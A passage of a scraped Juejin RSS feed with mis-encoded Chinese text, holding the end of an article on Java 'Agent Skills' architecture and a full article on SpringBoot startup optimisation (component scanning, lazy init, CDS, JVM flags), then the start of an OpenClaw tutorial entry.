<li><strong>å¤šå‰¯æœ¬éƒ¨ç½²</strong>ï¼šæ¯ä¸ªAgentéƒ¨ç½²å¤šä¸ªå®ä¾‹</li>
<li><strong>ç›‘æ§ä½“ç³»</strong>ï¼šPrometheus + Grafana</li>
<li><strong>æ—¥å¿—æ”¶é›†</strong>ï¼šELK Stackç»Ÿä¸€ç®¡ç†æ—¥å¿—</li>
</ul>
<h4 data-id="heading-25">7.2 æ€§èƒ½ä¼˜åŒ–</h4>
<ol>
<li><strong>è¿æ¥æ± ç®¡ç†</strong>ï¼šå¤ç”¨æ•°æ®åº“å’ŒHTTPè¿æ¥</li>
<li><strong>å¼‚æ­¥æ‰§è¡Œ</strong>ï¼šä½¿ç”¨çº¿ç¨‹æ± å¹¶è¡Œå¤„ç†ä»»åŠ¡</li>
<li><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼šç¼“å­˜å¸¸ç”¨æŸ¥è¯¢ç»“æœ</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šé˜²æ­¢æŠ€èƒ½æ‰§è¡Œæ—¶é—´è¿‡é•¿</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseAgent</span> {
    <span class="hljs-keyword">protected</span> ExecutorService executorService;

    <span class="hljs-keyword">protected</span> SkillResult <span class="hljs-title function_">executeSkill</span><span class="hljs-params">(Skill skill, String task,
                                       Map&lt;String, Object&gt; parameters)</span> {
        Future&lt;SkillResult&gt; future = executorService.submit(
            () -&gt; skill.execute(task, parameters)
        );
        <span class="hljs-keyword">return</span> future.get(skill.getTimeout(), TimeUnit.MILLISECONDS);
    }
}
</code></pre>
<h4 data-id="heading-26">7.3 é”™è¯¯å¤„ç†</h4>
<p>å®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    <span class="hljs-type">SkillResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> executeSkill(skill, task, parameters);
    <span class="hljs-keyword">if</span> (result.isSuccess()) {
        <span class="hljs-keyword">return</span> AgentResult.success(result.getMessage(), result.getData());
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è®°å½•é”™è¯¯æ—¥å¿—</span>
        logger.error(<span class="hljs-string">"Skill execution failed: {}"</span>, result.getError());
        <span class="hljs-comment">// å°è¯•å¤‡ç”¨æŠ€èƒ½</span>
        <span class="hljs-keyword">return</span> executeFallbackSkill(task, context);
    }
} <span class="hljs-keyword">catch</span> (TimeoutException e) {
    <span class="hljs-keyword">return</span> AgentResult.failure(<span class="hljs-string">"æ‰§è¡Œè¶…æ—¶"</span>);
} <span class="hljs-keyword">catch</span> (Exception e) {
    <span class="hljs-keyword">return</span> AgentResult.failure(<span class="hljs-string">"æ‰§è¡Œå¼‚å¸¸: "</span> + e.getMessage());
}
</code></pre>
<h3 data-id="heading-27">å…«ã€æµ‹è¯•ç­–ç•¥</h3>
<h4 data-id="heading-28">8.1 å•å…ƒæµ‹è¯•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@DisplayName("TextAnalysisSkillæµ‹è¯•")</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TextAnalysisSkillTest</span> {
    <span class="hljs-meta">@Test</span>
    <span class="hljs-meta">@DisplayName("æµ‹è¯•æƒ…æ„Ÿåˆ†æ")</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSentimentAnalysis</span><span class="hljs-params">()</span> {
        <span class="hljs-type">TextAnalysisSkill</span> <span class="hljs-variable">skill</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextAnalysisSkill</span>();

        Map&lt;String, Object&gt; parameters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        parameters.put(<span class="hljs-string">"text"</span>, <span class="hljs-string">"ä»Šå¤©å¿ƒæƒ…éå¸¸å¥½ï¼"</span>);
        parameters.put(<span class="hljs-string">"operation"</span>, <span class="hljs-string">"sentiment"</span>);

        <span class="hljs-type">SkillResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> skill.execute(<span class="hljs-string">"æƒ…æ„Ÿåˆ†æ"</span>, parameters);

        assertTrue(result.isSuccess());
        assertNotNull(result.getData());
    }
}
</code></pre>
<h4 data-id="heading-29">8.2 é›†æˆæµ‹è¯•</h4>
<p>æµ‹è¯•Agentä¸Skillsçš„åä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-meta">@DisplayName("æµ‹è¯•Agentå®Œæ•´æµç¨‹")</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testAgentWorkflow</span><span class="hljs-params">()</span> {
    <span class="hljs-type">DataAnalysisAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataAnalysisAgent</span>();
    <span class="hljs-type">AgentContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> AgentContext.create();

    <span class="hljs-type">AgentResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> agent.analyzeData(<span class="hljs-string">"æŠ€æœ¯éƒ¨"</span>, context);

    assertTrue(result.isSuccess());
    assertNotNull(result.getData());
}
</code></pre>
<h3 data-id="heading-30">ä¹ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-31">9.1 æŠ€èƒ½è®¾è®¡åŸåˆ™</h4>
<ol>
<li><strong>å•ä¸€èŒè´£</strong>ï¼šæ¯ä¸ªæŠ€èƒ½åªåšä¸€ä»¶äº‹</li>
<li><strong>å¹‚ç­‰æ€§</strong>ï¼šç›¸åŒè¾“å…¥äº§ç”Ÿç›¸åŒè¾“å‡º</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šè®¾ç½®åˆç†çš„æ‰§è¡Œè¶…æ—¶</li>
<li><strong>èµ„æºæ¸…ç†</strong>ï¼šæ‰§è¡Œå®Œæˆåé‡Šæ”¾èµ„æº</li>
</ol>
<h4 data-id="heading-32">9.2 Agentè®¾è®¡åŸåˆ™</h4>
<ol>
<li><strong>ä¸“æ³¨é¢†åŸŸ</strong>ï¼šæ¯ä¸ªAgentä¸“æ³¨ç‰¹å®šé¢†åŸŸ</li>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šè®°å½•å®Œæ•´çš„æ‰§è¡Œæ—¥å¿—</li>
<li><strong>å®¹é”™æ€§</strong>ï¼šä¼˜é›…å¤„ç†å„ç§å¼‚å¸¸æƒ…å†µ</li>
<li><strong>å¯æµ‹è¯•æ€§</strong>ï¼šä¾¿äºç¼–å†™å•å…ƒæµ‹è¯•</li>
</ol>
<h3 data-id="heading-33">åã€æ€»ç»“</h3>
<p>Agent Skillså·¥ä½œæµä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§ä¼˜é›…çš„æ¶æ„æ¨¡å¼ï¼Œå°†AIæ™ºèƒ½ä½“ä¸ä¼ ç»Ÿè½¯ä»¶å¼€å‘æœ‰æœºç»“åˆã€‚</p>
<p>æœªæ¥ï¼Œéšç€AIæŠ€æœ¯çš„å‘å±•ï¼ŒAgent Skillså°†åœ¨æ›´å¤šé¢†åŸŸå‘æŒ¥é‡è¦ä½œç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ]]></title>    <link>https://juejin.cn/post/7601018079619497999</link>    <guid>https://juejin.cn/post/7601018079619497999</guid>    <pubDate>2026-01-31T00:20:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601018079619497999" data-draft-id="7600976289064370176" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-31T00:20:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:20:40.000Z" title="Sat Jan 31 2026 00:20:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBooté¡¹ç›®å¯åŠ¨æ…¢ï¼Ÿ3ä¸ªä¼˜åŒ–æŠ€å·§è®©ä½ çš„åº”ç”¨å¿«å¦‚é—ªç”µ</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>SpringBootå› å…¶"çº¦å®šä¼˜äºé…ç½®"çš„ç†å¿µå’Œå¿«é€Ÿå¼€å‘èƒ½åŠ›ï¼Œå·²æˆä¸ºJavaç”Ÿæ€ä¸­æœ€æµè¡Œçš„æ¡†æ¶ä¹‹ä¸€ã€‚ç„¶è€Œï¼Œéšç€é¡¹ç›®è§„æ¨¡çš„å¢é•¿ï¼Œè®¸å¤šå¼€å‘è€…ä¼šé‡åˆ°ä¸€ä¸ªå…±åŒçš„é—®é¢˜ï¼š<strong>åº”ç”¨å¯åŠ¨é€Ÿåº¦å˜æ…¢</strong>ã€‚ä¸€ä¸ªåŸæœ¬èƒ½åœ¨5ç§’å†…å¯åŠ¨çš„Demoé¡¹ç›®ï¼Œåœ¨å¼•å…¥å‡ åä¸ªä¾èµ–ã€æ•°ç™¾ä¸ªBeanåï¼Œå¯åŠ¨æ—¶é—´å¯èƒ½éª¤å¢è‡³30ç§’ç”šè‡³æ›´ä¹…ã€‚è¿™åœ¨å¼€å‘è°ƒè¯•ã€CI/CDæµæ°´çº¿ä»¥åŠéœ€è¦å¿«é€Ÿæ‰©å±•çš„äº‘åŸç”Ÿåœºæ™¯ä¸­ä¼šå¸¦æ¥æ˜¾è‘—çš„æ•ˆç‡ç“¶é¢ˆã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥åˆ†æSpringBootå¯åŠ¨è¿‡ç¨‹çš„å…³é”®æ€§èƒ½ç“¶é¢ˆï¼Œå¹¶æä¾›3ä¸ªç»è¿‡å®æˆ˜éªŒè¯çš„ä¼˜åŒ–æŠ€å·§ï¼ˆæ¶µç›–JVMå±‚é¢ã€Springæœºåˆ¶å’Œå·¥ç¨‹å®è·µï¼‰ï¼Œå¸®åŠ©ä½ å°†åº”ç”¨å¯åŠ¨æ—¶é—´å‹ç¼©åˆ°æè‡´ã€‚æ–‡ä¸­çš„æ–¹æ¡ˆå‡åŸºäºSpringBoot 2.7+å’ŒJDK 11+ç¯å¢ƒéªŒè¯ï¼Œéƒ¨åˆ†æŠ€å·§åœ¨æœ€æ–°SpringBoot 3.0ä¸­æœ‰è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€ç†è§£SpringBootå¯åŠ¨è¿‡ç¨‹çš„æ ¸å¿ƒç“¶é¢ˆ</h3>
<p>åœ¨ç€æ‰‹ä¼˜åŒ–å‰ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®SpringBootåº”ç”¨å¯åŠ¨æ—¶çš„ä¸»è¦è€—æ—¶é˜¶æ®µï¼ˆä»¥ä¸‹æ•°æ®åŸºäºå…¸å‹ä¸­å‹é¡¹ç›®ç»Ÿè®¡ï¼‰ï¼š</p>
<ol>
<li>
<p><strong>ç±»åŠ è½½ä¸æ‰«æï¼ˆå æ¯”40%-50%ï¼‰</strong></p>
<ul>
<li><code>ComponentScan</code>å¯¹åŸºåŒ…ä¸‹æ‰€æœ‰ç±»çš„ASMå­—èŠ‚ç è§£æ</li>
<li><code>@Configuration</code>ç±»ä¸­<code>@Bean</code>æ–¹æ³•çš„åŠ¨æ€ä»£ç†ç”Ÿæˆ</li>
<li>æ¡ä»¶æ³¨è§£ï¼ˆå¦‚<code>@ConditionalOnClass</code>ï¼‰çš„é€’å½’æ ¡éªŒ</li>
</ul>
</li>
<li>
<p><strong>Beanåˆå§‹åŒ–ï¼ˆå æ¯”30%-40%ï¼‰</strong></p>
<ul>
<li>Beanä¾èµ–å…³ç³»çš„æ‹“æ‰‘æ’åº</li>
<li><code>@PostConstruct</code>æ–¹æ³•æ‰§è¡Œ</li>
<li>éœ€è¦<code>ProxyFactory</code>åˆ›å»ºçš„AOPä»£ç†å¯¹è±¡</li>
</ul>
</li>
<li>
<p><strong>å¤–éƒ¨èµ„æºè¿æ¥ï¼ˆå æ¯”10%-20%ï¼‰</strong></p>
<ul>
<li>æ•°æ®åº“è¿æ¥æ± åˆå§‹åŒ–</li>
<li>Redis/MQç­‰ä¸­é—´ä»¶å¥åº·æ£€æŸ¥</li>
<li>Consul/Nacosç­‰é…ç½®ä¸­å¿ƒæ‹‰å–é…ç½®</li>
</ul>
</li>
<li>
<p><strong>å…¶ä»–JVMå¼€é”€ï¼ˆå æ¯”5%-10%ï¼‰</strong></p>
<ul>
<li>JITç¼–è¯‘é¢„çƒ­ä¸è¶³å¯¼è‡´çš„è§£é‡Šæ‰§è¡Œ</li>
<li>CMS/G1åƒåœ¾å›æ”¶å™¨çš„åˆå§‹å †è°ƒæ•´</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-3">äºŒã€æŠ€å·§1ï¼šç²¾å‡†æ§åˆ¶ç»„ä»¶çš„æ‰«æä¸åŠ è½½</h3>
<h4 data-id="heading-4">2.1 ä½¿ç”¨@ComponentScançš„excludeFilterså®šå‘æ’é™¤</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ComponentScan(
    basePackages = "com.example",
    excludeFilters = @Filter(type = FilterType.REGEX, pattern = "com.example.exclude.*")
)</span>
</code></pre>
<p>é€šè¿‡æ­£åˆ™æˆ–æ³¨è§£ç±»å‹æ˜¾å¼æ’é™¤ä¸éœ€è¦çš„ç»„ä»¶ï¼Œå¯å‡å°‘20%-30%çš„ç±»æ‰«ææ—¶é—´ã€‚</p>
<h4 data-id="heading-5">2.2 å¯ç”¨Lazy Initæ¨¡å¼ï¼ˆæƒè¡¡æ–¹æ¡ˆï¼‰</h4>
<pre><code class="hljs language-properties" lang="properties">spring.main.lazy-initialization=true
</code></pre>
<p>æ­¤é…ç½®ä¼šè®©æ‰€æœ‰Beanå»¶è¿Ÿåˆå§‹åŒ–ç›´åˆ°é¦–æ¬¡ä½¿ç”¨ï¼Œä½†å¯èƒ½å¯¼è‡´ç¬¬ä¸€æ¬¡è¯·æ±‚å“åº”å˜æ…¢ã€‚æ›´é€‚åˆåå°ä»»åŠ¡å‹åº”ç”¨è€Œéé«˜å®æ—¶æ€§æœåŠ¡ã€‚</p>
<h4 data-id="heading-6">2.3 Spring Boot 2.6+çš„æ–°ç‰¹æ€§ï¼šç´¢å¼•åŠ é€Ÿ</h4>
<p>åœ¨é¡¹ç›®ä¸­æ·»åŠ <code>spring-context-indexer</code>ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context-indexer<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç¼–è¯‘æ—¶ä¼šç”Ÿæˆ<code>META-INF/spring.components</code>ç´¢å¼•æ–‡ä»¶ï¼Œæ›¿ä»£è¿è¡Œæ—¶åå°„æ‰«æã€‚</p>
<hr/>
<h3 data-id="heading-7">ä¸‰ã€æŠ€å·§2ï¼šJVMå±‚çº§çš„æ·±åº¦è°ƒä¼˜</h3>
<h4 data-id="heading-8">3.1 Class Data Sharing (CDS)</h4>
<p>é€‚ç”¨äºå¤šå®ä¾‹éƒ¨ç½²åœºæ™¯ï¼š</p>
<ol>
<li>åˆ›å»ºå…±äº«å½’æ¡£ï¼š
<pre><code class="hljs language-bash" lang="bash">java -Xshare:dump -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar --spring.main.exit-on-startup-complete=<span class="hljs-literal">true</span>
</code></pre>
</li>
<li>å¯åŠ¨æ—¶åŠ è½½ï¼š
<pre><code class="hljs language-bash" lang="bash">java -Xshare:on -XX:SharedArchiveFile=app.jsa \
     -jar your-app.jar
</code></pre>
</li>
</ol>
<p>å®æµ‹å¯å‡å°‘15%-20%çš„ç±»åŠ è½½æ—¶é—´ã€‚</p>
<h4 data-id="heading-9">3.2 Tiered Compilationç­–ç•¥è°ƒæ•´</h4>
<p>å¯¹äºçŸ­ç”Ÿå‘½å‘¨æœŸçš„å¼€å‘ç¯å¢ƒï¼š</p>
<pre><code class="hljs language-properties" lang="properties">-XX:TieredStopAtLevel=1 
</code></pre>
<p>é™åˆ¶JITç¼–è¯‘åˆ°C1å±‚çº§ï¼Œç‰ºç‰²å°‘é‡å³°å€¼æ€§èƒ½æ¢å–æ›´å¿«çš„å¯åŠ¨é€Ÿåº¦ã€‚</p>
<h4 data-id="heading-10">3.3 Heap Sizeé¢„åˆ†é…</h4>
<p>é¿å…åŠ¨æ€æ‰©å®¹å¸¦æ¥çš„GCå¼€é”€ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">-Xms512m -Xmx512m 
</code></pre>
<hr/>
<h3 data-id="heading-11">å››ã€æŠ€å·§3ï¼šå·¥ç¨‹åŒ–å±‚é¢çš„æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-12">4.1 Spring Cloudä¸Šä¸‹æ–‡åˆ†ç¦»</h4>
<p>å¦‚æœä½¿ç”¨Spring Cloudç»„ä»¶ï¼Œå»ºè®®æ‹†åˆ†bootstrapä¸Šä¸‹æ–‡ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.cloud.bootstrap.enabled=false # Spring Boot 2.4+
spring.config.use-legacy-processing=true 
</code></pre>
<h4 data-id="heading-13">4.2 AutoConfigurationæŒ‰éœ€å¼•å…¥</h4>
<p>æ£€æŸ¥è‡ªåŠ¨è£…é…æŠ¥å‘Šï¼š</p>
<pre><code class="hljs language-bash" lang="bash">java -jar your-app.jar --debug
</code></pre>
<p>åœ¨è¾“å‡ºä¸­æ‰¾åˆ°æœªè¢«ä½¿ç”¨çš„<code>@AutoConfiguration</code>ç±»ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼æ’é™¤ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration
</code></pre>
<h4 data-id="heading-14">4.3 Build-Time Hints (Spring Nativeè¿›é˜¶)</h4>
<p>å¯¹äºGraalVM Native Imageæ„å»ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@NativeHint(
    types = @TypeHint(types = {com.example.MyService.class})
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHints</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">NativeConfiguration</span> {}
</code></pre>
<hr/>
<h3 data-id="heading-15">äº”ã€æ€»ç»“ä¸æ•ˆæœå¯¹æ¯”</h3>
<p>ç»¼åˆè¿ç”¨ä¸Šè¿°ç­–ç•¥åï¼Œæˆ‘ä»¬åœ¨ä¸€å°4æ ¸8Gçš„å¼€å‘æœºä¸Šå¯¹ä¸€ä¸ªåŒ…å«200+ Beançš„é¡¹ç›®è¿›è¡Œæµ‹è¯•ï¼š</p>






























<table><thead><tr><th>ä¼˜åŒ–é˜¶æ®µ</th><th>å¯åŠ¨æ—¶é—´(ç§’)</th><th>ä¸‹é™å¹…åº¦</th></tr></thead><tbody><tr><td>åŸå§‹çŠ¶æ€</td><td>28s</td><td>-</td></tr><tr><td>ç»„ä»¶æ‰«æä¼˜åŒ–å</td><td>19s</td><td>32%â†“</td></tr><tr><td>JVMè°ƒä¼˜å</td><td>14s</td><td>26%â†“</td></tr><tr><td>å·¥ç¨‹åŒ–æ”¹é€ å</td><td>9s</td><td>35%â†“</td></tr></tbody></table>
<p>æœ€ç»ˆçš„9ç§’ç›¸æ¯”åˆå§‹28ç§’æå‡äº†67%ï¼Œå¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒç»“åˆAOTç¼–è¯‘ï¼ˆå¦‚Spring Nativeï¼‰ï¼Œç”šè‡³å¯ä»¥å‹ç¼©åˆ°5ç§’ä»¥å†…ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒé¡¹ç›®çš„ç‰¹ç‚¹å¯èƒ½å¯¼è‡´ä¼˜åŒ–ä¾§é‡ç‚¹ä¸åŒâ€”â€”I/Oå¯†é›†å‹åº”ç”¨åº”ä¾§é‡å¤–éƒ¨è¿æ¥ä¼˜åŒ–ï¼›å¤§å‹å•ä½“åˆ™éœ€è¦é‡ç‚¹è§£å†³ç±»åŠ è½½é—®é¢˜ã€‚å»ºè®®ä½¿ç”¨AsyncProfileræˆ–Arthasè¿›è¡Œé’ˆå¯¹æ€§è¯Šæ–­åå†å®æ–½å…·ä½“æ–¹æ¡ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹]]></title>    <link>https://juejin.cn/post/7600953879501439027</link>    <guid>https://juejin.cn/post/7600953879501439027</guid>    <pubDate>2026-01-31T00:25:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600953879501439027" data-draft-id="7601028900886315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> 